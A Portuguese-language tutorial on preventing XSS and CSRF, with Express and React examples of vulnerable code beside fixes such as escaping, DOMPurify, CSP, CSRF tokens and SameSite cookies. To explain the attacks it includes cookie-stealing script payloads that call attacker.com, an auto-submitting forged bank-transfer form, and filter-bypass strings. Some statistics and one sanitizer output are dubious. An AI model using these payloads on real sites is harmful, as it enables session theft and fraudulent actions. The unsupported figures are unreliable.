# Prevenção de XSS e CSRF: Uma Análise Conceitual Profunda

## 🎯 Introdução e Definição

### Definição Conceitual

**XSS (Cross-Site Scripting)** e **CSRF (Cross-Site Request Forgery)** são **vulnerabilidades web** onde atacantes exploram **trust relationships**: XSS explora **confiança do usuário no site** (injeta código malicioso em páginas confiáveis), CSRF explora **confiança do site no usuário** (envia requests forjados usando credenciais autênticas). **XSS** permite **executar JavaScript arbitrário** no contexto da página (roubar cookies, session, dados sensíveis), **CSRF** permite **executar ações não-autorizadas** (transferências, mudanças de senha, posts) usando **sessão autenticada da vítima**.

Conceitualmente, **prevenção** requer **múltiplas camadas**: XSS é prevenido via **input sanitization** (validar/escapar user input), **output encoding** (escapar output HTML/JS), **Content Security Policy** (CSP bloqueia inline scripts), **httpOnly cookies** (JavaScript não acessa). CSRF é prevenido via **CSRF tokens** (unique token por request), **SameSite cookies** (browser bloqueia cross-site cookies), **custom headers** (preflight CORS), **origin/referer validation** (verificar request origin).

```javascript
// XSS Vulnerability Example:
// ❌ VULNERÁVEL - Inserir user input diretamente no HTML
const username = '<script>alert("XSS")</script>';
element.innerHTML = `Welcome ${username}`;
// Resultado: Script executa (XSS attack)

// ✅ SEGURO - Usar textContent (escapa HTML)
element.textContent = `Welcome ${username}`;
// Resultado: Mostra literal "<script>..." (sem executar)

// CSRF Vulnerability Example:
// ❌ VULNERÁVEL - POST sem CSRF protection
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker-account">
  <input name="amount" value="10000">
</form>
<!-- Atacante hospeda em site malicioso -->
<!-- Se usuário está logado em bank.com: request usa cookies autênticos -->

// ✅ SEGURO - CSRF token
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="abc123...">
  <input name="to" value="account">
  <input name="amount" value="100">
</form>
<!-- Backend valida token - request forjado falha -->
```

### Contexto Histórico e Motivação

**Evolução de Web Security:**

1. **Static HTML (1990s)**: Sem user input, sem vulnerabilidades
2. **Dynamic Content (2000s)**: User input → XSS emerge
3. **AJAX (2005+)**: XMLHttpRequest → CSRF ataques crescem
4. **Modern Web (2010+)**: SPAs, APIs → XSS/CSRF evoluem
5. **CSP & SameSite (2015+)**: Defesas browser-level

**Motivação XSS Prevention:**

XSS permite atacantes **executarem código no contexto da vítima**: roubar cookies (session hijacking), capturar keystrokes, phishing, redirect malicioso. **Input sanitization** e **output encoding** previnem injeção. **CSP** adiciona defesa-em-profundidade bloqueando inline scripts.

**Motivação CSRF Prevention:**

CSRF permite atacantes **executarem ações usando credenciais da vítima** sem seu conhecimento: transferências bancárias, mudanças de email/senha, posts sociais. **CSRF tokens** garantem requests vieram do **site legítimo** (não forjados). **SameSite cookies** bloqueiam cookies cross-site (browser-level defense).

### Problema Fundamental que Resolve

XSS e CSRF prevention resolvem problemas críticos:

**XSS Prevention:**
**1. Code Injection**: Prevenir execução de scripts maliciosos
**2. Session Hijacking**: Proteger cookies/tokens via httpOnly
**3. Data Theft**: Impedir acesso a DOM sensível
**4. Defacement**: Bloquear modificações maliciosas da página

**CSRF Prevention:**
**1. Forged Requests**: Validar requests são intencionais (não forjados)
**2. State-Changing Actions**: Proteger POST/PUT/DELETE
**3. Cross-Site Abuse**: Bloquear requests de sites maliciosos
**4. Session Abuse**: Garantir usuário autorizou a ação

### Importância no Ecossistema

XSS e CSRF são **top web vulnerabilities** (OWASP Top 10):

- **XSS**: #3 mais comum (afeta ~40% sites)
- **CSRF**: #8 mais comum (afeta ~30% sites)
- **Impact**: Data breach, account takeover, financial loss
- **Prevention**: Multi-layered (sanitization, CSP, tokens, SameSite)

---

## 📋 Sumário Conceitual

### Aspectos Teóricos Centrais

1. **XSS Types**: Reflected, Stored, DOM-based
2. **XSS Prevention**: Sanitization, Output Encoding, CSP
3. **CSRF Mechanism**: Forged requests usando authenticated session
4. **CSRF Prevention**: CSRF tokens, SameSite cookies, Custom headers
5. **Defense-in-Depth**: Múltiplas camadas de proteção

### Pilares Fundamentais

- **Input Sanitization**: Validar/escapar user input
- **Output Encoding**: Escapar HTML/JS/URL output
- **CSP**: Content Security Policy bloqueia inline scripts
- **httpOnly Cookies**: JavaScript não acessa (previne XSS theft)
- **CSRF Tokens**: Unique token por request (server valida)
- **SameSite Cookies**: Browser bloqueia cross-site cookies

### Visão Geral das Nuances

- **XSS Reflected**: Input reflected em response (URL params)
- **XSS Stored**: Input armazenado (DB) e exibido depois
- **XSS DOM-based**: Client-side JavaScript vulnerável
- **CSRF**: Apenas state-changing requests (POST/PUT/DELETE)
- **CSRF vs CORS**: CSRF usa cookies, CORS bloqueia cross-origin reads

---

## 🧠 Fundamentos Teóricos

### XSS: Reflected (Non-Persistent)

```javascript
// Reflected XSS: Input reflected imediatamente em response

// ❌ VULNERÁVEL Backend (Node.js/Express):
app.get('/search', (req, res) => {
  const query = req.query.q; // User input (URL param)
  
  res.send(`
    <h1>Search Results for: ${query}</h1>
    <p>No results found.</p>
  `);
});

// Attack URL:
// https://example.com/search?q=<script>alert(document.cookie)</script>

// Resultado: Script executa quando vítima abre URL
// Cookie roubado: atacante captura via alert ou envia para servidor malicioso

// ✅ SEGURO - Escapar output HTML:
const escapeHTML = (str) => {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
};

app.get('/search', (req, res) => {
  const query = escapeHTML(req.query.q);
  
  res.send(`
    <h1>Search Results for: ${query}</h1>
    <p>No results found.</p>
  `);
});

// Attack URL:
// https://example.com/search?q=<script>alert(1)</script>

// Resultado: Mostra literal "&lt;script&gt;..." (não executa)
```

### XSS: Stored (Persistent)

```javascript
// Stored XSS: Input armazenado (DB) e exibido para outros usuários

// ❌ VULNERÁVEL - Salvar e exibir comentário sem sanitização:
// Backend:
app.post('/comments', async (req, res) => {
  const { text } = req.body;
  
  await db.comments.insert({ text }); // Salva sem sanitização
  
  res.json({ success: true });
});

app.get('/comments', async (req, res) => {
  const comments = await db.comments.find();
  
  res.send(`
    <div>
      ${comments.map(c => `<p>${c.text}</p>`).join('')}
    </div>
  `);
});

// Ataque:
// POST /comments
// { "text": "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>" }

// Resultado: TODOS usuários que visitam /comments executam script
// Cookies de TODOS usuários roubados

// ✅ SEGURO - Sanitizar input E escapar output:
const DOMPurify = require('isomorphic-dompurify');

app.post('/comments', async (req, res) => {
  const { text } = req.body;
  
  // Sanitizar HTML (remover scripts)
  const sanitized = DOMPurify.sanitize(text, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  });
  
  await db.comments.insert({ text: sanitized });
  
  res.json({ success: true });
});

// Frontend (React):
function Comment({ text }) {
  // React escapa automaticamente por padrão
  return <p>{text}</p>;
  
  // ⚠️ Se precisar HTML (raro):
  // return <p dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(text) }} />;
}
```

### XSS: DOM-based

```javascript
// DOM-based XSS: JavaScript vulnerável no client-side

// ❌ VULNERÁVEL - Inserir URL fragment no DOM:
// HTML:
<div id="welcome"></div>

// JavaScript:
const params = new URLSearchParams(window.location.search);
const username = params.get('name');

document.getElementById('welcome').innerHTML = `Welcome ${username}!`;

// Attack URL:
// https://example.com/?name=<img src=x onerror=alert(document.cookie)>

// Resultado: Script executa via onerror handler

// ✅ SEGURO - Usar textContent ou sanitizar:
const username = params.get('name');

// Opção 1: textContent (escapa HTML)
document.getElementById('welcome').textContent = `Welcome ${username}!`;

// Opção 2: Sanitizar HTML
import DOMPurify from 'dompurify';

document.getElementById('welcome').innerHTML = DOMPurify.sanitize(
  `Welcome ${username}!`
);
```

### CSRF Attack Mechanism

```javascript
// CSRF: Atacante força vítima executar ação não-autorizada

// Cenário: Site bancário vulnerável
// Backend:
app.post('/transfer', (req, res) => {
  const userId = req.session.userId; // Autenticado via cookie
  const { to, amount } = req.body;
  
  // ❌ Sem CSRF protection
  db.transfer({ from: userId, to, amount });
  
  res.json({ success: true });
});

// Site malicioso (attacker.com):
<html>
  <body onload="document.getElementById('evil-form').submit()">
    <form id="evil-form" action="https://bank.com/transfer" method="POST">
      <input name="to" value="attacker-account">
      <input name="amount" value="10000">
    </form>
  </body>
</html>

// Flow:
// 1. Vítima está logada em bank.com (cookie autêntico)
// 2. Vítima visita attacker.com (email phishing)
// 3. Form auto-submits para bank.com
// 4. Browser envia cookie autêntico com request
// 5. Backend processa transferência (válida do ponto de vista da sessão)
// 6. $10,000 transferidos para atacante
```

### CSRF Prevention: CSRF Token (Synchronizer Token Pattern)

```javascript
// CSRF Token: Server gera token único, valida em cada request

// Backend (Node.js/Express com csurf):
const csrf = require('csurf');

const csrfProtection = csrf({ cookie: true });

// Gerar token (GET)
app.get('/transfer-form', csrfProtection, (req, res) => {
  res.send(`
    <form action="/transfer" method="POST">
      <input type="hidden" name="_csrf" value="${req.csrfToken()}">
      <input name="to" placeholder="Account">
      <input name="amount" placeholder="Amount">
      <button>Transfer</button>
    </form>
  `);
});

// Validar token (POST)
app.post('/transfer', csrfProtection, (req, res) => {
  const userId = req.session.userId;
  const { to, amount } = req.body;
  
  // csurf middleware valida _csrf token automaticamente
  // Se token inválido/missing: 403 Forbidden
  
  db.transfer({ from: userId, to, amount });
  
  res.json({ success: true });
});

// Frontend (React):
function TransferForm() {
  const [csrfToken, setCsrfToken] = useState('');
  
  useEffect(() => {
    // Fetch CSRF token
    fetch('/csrf-token')
      .then(r => r.json())
      .then(data => setCsrfToken(data.csrfToken));
  }, []);
  
  const handleSubmit = async (e) => {
    e.preventDefault();
    
    await fetch('/transfer', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        to: e.target.to.value,
        amount: e.target.amount.value,
        _csrf: csrfToken // Include token
      })
    });
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input name="to" />
      <input name="amount" />
      <button>Transfer</button>
    </form>
  );
}

// Proteção: Atacante não consegue obter CSRF token (Same-Origin Policy)
```

### CSRF Prevention: SameSite Cookies

```javascript
// SameSite: Browser bloqueia cookies em cross-site requests

// Backend: Configurar SameSite cookie
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // Validate credentials...
  
  const sessionId = generateSessionId();
  
  res.cookie('sessionId', sessionId, {
    httpOnly: true,   // XSS protection
    secure: true,     // HTTPS only
    sameSite: 'Lax',  // CSRF protection
    maxAge: 3600000   // 1 hour
  });
  
  res.json({ success: true });
});

// SameSite valores:
// - 'Strict': Cookie NUNCA enviado cross-site (nem links)
// - 'Lax': Cookie enviado em top-level navigations (GET links)
//           NÃO enviado em iframes, AJAX cross-site, POST forms cross-site
// - 'None': Cookie sempre enviado (requer Secure)

// Com SameSite: 'Lax', CSRF attack falha:
// attacker.com → POST bank.com/transfer
// Browser NÃO envia sessionId cookie (cross-site POST)
// Backend: 401 Unauthorized (sem session)

// ⚠️ Navegação normal funciona:
// Link de email → GET bank.com/dashboard
// Browser envia cookie (top-level navigation)
```

### CSRF Prevention: Custom Headers

```javascript
// Custom Header: CORS preflight bloqueia cross-origin

// Frontend (SPA):
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest' // Custom header
  },
  body: JSON.stringify({ to: 'account', amount: 100 })
});

// Backend:
app.post('/api/transfer', (req, res) => {
  // Validar custom header presente
  if (!req.headers['x-requested-with']) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  // Process transfer...
  res.json({ success: true });
});

// Proteção:
// Atacante tenta CSRF de attacker.com:
fetch('https://bank.com/api/transfer', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest' // Custom header
  },
  body: JSON.stringify({ to: 'attacker', amount: 10000 })
});

// Browser envia preflight OPTIONS (CORS)
// bank.com NÃO permite attacker.com (sem Access-Control-Allow-Origin)
// Request bloqueado ANTES de executar
```

### CSRF Prevention: Origin/Referer Validation

```javascript
// Origin/Referer: Validar request veio do próprio site

// Backend:
app.post('/api/transfer', (req, res) => {
  const origin = req.headers.origin;
  const referer = req.headers.referer;
  
  const allowedOrigins = [
    'https://bank.com',
    'https://www.bank.com'
  ];
  
  // Validar origin
  if (origin && !allowedOrigins.includes(origin)) {
    return res.status(403).json({ error: 'Forbidden origin' });
  }
  
  // Validar referer (fallback se origin missing)
  if (!origin && referer) {
    const refererOrigin = new URL(referer).origin;
    
    if (!allowedOrigins.includes(refererOrigin)) {
      return res.status(403).json({ error: 'Forbidden referer' });
    }
  }
  
  // Process transfer...
  res.json({ success: true });
});

// ⚠️ Limitação:
// - Origin pode estar missing (privacy settings)
// - Referer pode estar missing (privacy settings, HTTPS→HTTP)
// - Não é defesa primária (use com CSRF tokens ou SameSite)
```

---

## 🔍 Análise Conceitual Profunda

### Pattern 1: React XSS Prevention (Built-in)

```javascript
// React escapa automaticamente JSX expressions

// ✅ SEGURO - React escapa {username}:
function Welcome({ username }) {
  return <h1>Welcome {username}!</h1>;
}

// Ataque:
<Welcome username="<script>alert(1)</script>" />

// Resultado: Mostra literal "<script>..." (não executa)
// React converte < para &lt; automaticamente

// ❌ PERIGO - dangerouslySetInnerHTML bypassa escaping:
function Comment({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// Ataque:
<Comment html="<script>alert(1)</script>" />

// Resultado: Script EXECUTA (XSS)

// ✅ SEGURO - Sanitizar antes de dangerouslySetInnerHTML:
import DOMPurify from 'dompurify';

function Comment({ html }) {
  const sanitized = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
    ALLOWED_ATTR: ['href']
  });
  
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

### Pattern 2: Content Security Policy (CSP)

```javascript
// CSP: HTTP header bloqueia inline scripts (defesa-em-profundidade)

// Backend (Express):
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "https://trusted-cdn.com"],
    styleSrc: ["'self'", "'unsafe-inline'"], // CSS inline permitido
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.example.com"],
    fontSrc: ["'self'", "https://fonts.googleapis.com"],
    objectSrc: ["'none'"],
    upgradeInsecureRequests: []
  }
}));

// Response header:
// Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; ...

// Proteção:
// ❌ Inline scripts bloqueados:
<script>alert('XSS')</script>
// Browser: Refused to execute inline script (CSP)

// ✅ External scripts permitidos (self e trusted-cdn):
<script src="/js/app.js"></script>
<script src="https://trusted-cdn.com/lib.js"></script>

// ❌ Scripts de outros domínios bloqueados:
<script src="https://evil.com/malicious.js"></script>
// Browser: Refused to load (CSP)

// CSP com nonce (para inline scripts necessários):
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use(helmet.contentSecurityPolicy({
  directives: {
    scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`]
  }
}));

// HTML:
<script nonce="<%= nonce %>">
  console.log('Allowed inline script');
</script>
```

### Pattern 3: Double Submit Cookie (CSRF Alternative)

```javascript
// Double Submit Cookie: CSRF token em cookie E request body/header

// Backend:
app.use((req, res, next) => {
  if (!req.cookies.csrfToken) {
    const token = crypto.randomBytes(32).toString('hex');
    
    res.cookie('csrfToken', token, {
      sameSite: 'Strict',
      secure: true
    });
  }
  
  next();
});

app.post('/api/transfer', (req, res) => {
  const cookieToken = req.cookies.csrfToken;
  const headerToken = req.headers['x-csrf-token'];
  
  // Validar tokens match
  if (!cookieToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: 'CSRF token mismatch' });
  }
  
  // Process transfer...
  res.json({ success: true });
});

// Frontend:
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  
  if (parts.length === 2) {
    return parts.pop().split(';').shift();
  }
}

fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': getCookie('csrfToken') // Enviar token do cookie
  },
  body: JSON.stringify({ to: 'account', amount: 100 })
});

// Proteção:
// Atacante de attacker.com NÃO consegue ler csrfToken cookie (Same-Origin Policy)
// Request forjado falha (header sem token ou token incorreto)
```

### Pattern 4: httpOnly Cookies (XSS Mitigation)

```javascript
// httpOnly: JavaScript não acessa cookie (previne XSS theft)

// Backend:
app.post('/login', (req, res) => {
  // Validate credentials...
  
  const sessionId = generateSessionId();
  
  res.cookie('sessionId', sessionId, {
    httpOnly: true,   // ✅ JavaScript não acessa
    secure: true,     // HTTPS only
    sameSite: 'Lax',  // CSRF protection
    maxAge: 3600000
  });
  
  res.json({ success: true });
});

// Frontend:
// ❌ Não consegue acessar sessionId via JavaScript:
console.log(document.cookie);
// Resultado: "" (httpOnly cookies não aparecem)

// XSS Attack mitigation:
<script>
  // Atacante tenta roubar cookie:
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
  // cookie está vazio (httpOnly bloqueou)
</script>

// ✅ Cookie enviado automaticamente em requests:
fetch('/api/profile', {
  credentials: 'include' // Browser envia sessionId cookie
});
```

### Pattern 5: Input Validation & Sanitization

```javascript
// Input Validation: Validar tipo, formato, range

// Backend (Express + Joi):
const Joi = require('joi');

const commentSchema = Joi.object({
  text: Joi.string()
    .min(1)
    .max(500)
    .required(),
  email: Joi.string()
    .email()
    .required()
});

app.post('/comments', async (req, res) => {
  // Validar schema
  const { error, value } = commentSchema.validate(req.body);
  
  if (error) {
    return res.status(400).json({ error: error.details[0].message });
  }
  
  const { text, email } = value;
  
  // Sanitizar HTML
  const sanitized = DOMPurify.sanitize(text, {
    ALLOWED_TAGS: [],    // Sem tags HTML
    ALLOWED_ATTR: []
  });
  
  await db.comments.insert({
    text: sanitized,
    email: email.toLowerCase()
  });
  
  res.json({ success: true });
});

// Ataque:
// POST /comments
// { "text": "<script>alert(1)</script>", "email": "test@example.com" }

// Resultado:
// sanitized = "alert(1)" (tags removidas)
// Salvo sem scripts
```

### Pattern 6: Rate Limiting (CSRF Mitigation)

```javascript
// Rate Limiting: Limitar requests por IP/user (dificultar brute-force CSRF)

const rateLimit = require('express-rate-limit');

const transferLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5,                    // Max 5 transfers per window
  message: 'Too many transfer requests, try again later',
  standardHeaders: true,
  legacyHeaders: false
});

app.post('/api/transfer', transferLimiter, (req, res) => {
  // Process transfer...
  res.json({ success: true });
});

// Proteção:
// Atacante tenta CSRF em massa:
// Request 1-5: Executadas
// Request 6+: 429 Too Many Requests (bloqueado por 15 min)
```

---

## 🎯 Aplicabilidade e Contextos

### Quando Usar XSS Prevention

**✅ User Input**: Sempre sanitizar/escapar
**✅ Dynamic HTML**: Usar textContent ou DOMPurify
**✅ Rich Text Editors**: Whitelist tags/attributes
**✅ API Responses**: Escapar output HTML
**✅ CSP**: Deploy em produção

### Quando Usar CSRF Prevention

**✅ State-Changing Requests**: POST, PUT, DELETE
**✅ Authenticated Actions**: Transferências, mudanças de senha
**✅ SameSite Cookies**: Default 'Lax' ou 'Strict'
**✅ CSRF Tokens**: APIs tradicionais
**✅ Custom Headers**: SPAs com CORS

---

## ⚠️ Limitações e Considerações Teóricas

### Limitações XSS Prevention

**1. Sanitização Complexa**: DOMPurify pode ter bypasses
**2. CSP Compatibility**: Browsers antigos não suportam
**3. Third-party Scripts**: CDNs podem ser comprometidos
**4. DOM-based XSS**: JavaScript client-side vulnerável

### Limitações CSRF Prevention

**1. SameSite Support**: Browsers antigos não suportam
**2. CSRF Tokens**: Requer server-side session
**3. Stateless APIs**: JWT não protege CSRF (usar custom headers)
**4. Subdomain Attacks**: Attacker em subdomain pode CSRF

### Armadilhas Comuns

#### Armadilha 1: Confiar em Client-Side Validation

```javascript
// ❌ ERRO - Validar apenas no frontend
function submitComment(text) {
  if (text.includes('<script>')) {
    alert('Invalid input');
    return;
  }
  
  // Enviar sem sanitizar
  fetch('/comments', {
    method: 'POST',
    body: JSON.stringify({ text })
  });
}

// Atacante bypassa via DevTools ou curl:
// curl -X POST https://example.com/comments -d '{"text":"<script>...</script>"}'

// ✅ CORRETO - Validar E sanitizar NO BACKEND
```

#### Armadilha 2: Usar Blacklist (Filtering)

```javascript
// ❌ ERRO - Blacklist é fácil de bypass
const sanitize = (str) => {
  return str
    .replace(/<script>/gi, '')
    .replace(/<iframe>/gi, '');
};

// Bypass:
// Input: "<scr<script>ipt>alert(1)</script>"
// Resultado: "<script>alert(1)</script>" (inner <script> removido, outer permanece)

// ✅ CORRETO - Whitelist tags (DOMPurify)
```

---

## 🔗 Interconexões Conceituais

### Relação com CORS

**CSRF usa cookies**, CORS bloqueia cross-origin **reads** (não writes).

### Relação com Authentication

**httpOnly cookies** previnem XSS theft. **CSRF tokens** protegem authenticated actions.

### Relação com Content Security Policy

**CSP** bloqueia inline scripts (XSS defense-in-depth).

---

## 🚀 Evolução e Próximos Conceitos

### Próximos Passos

1. **Content Security Policy**: CSP directives, nonce/hash
2. **Security Headers**: X-Frame-Options, HSTS, X-Content-Type-Options
3. **OWASP Top 10**: Outras vulnerabilidades web

---

## 📚 Conclusão

XSS e CSRF são vulnerabilidades críticas que requerem **prevenção multi-layered**.

Dominar prevenção significa:
- **XSS**: Sanitizar input, escapar output, CSP, httpOnly cookies
- **CSRF**: CSRF tokens, SameSite cookies, custom headers, origin validation
- **Defense-in-Depth**: Múltiplas camadas (não confiar em single defense)
- **Validation**: Backend validation (nunca confiar em client-side)

É essencial para aplicações web seguras e compliance.
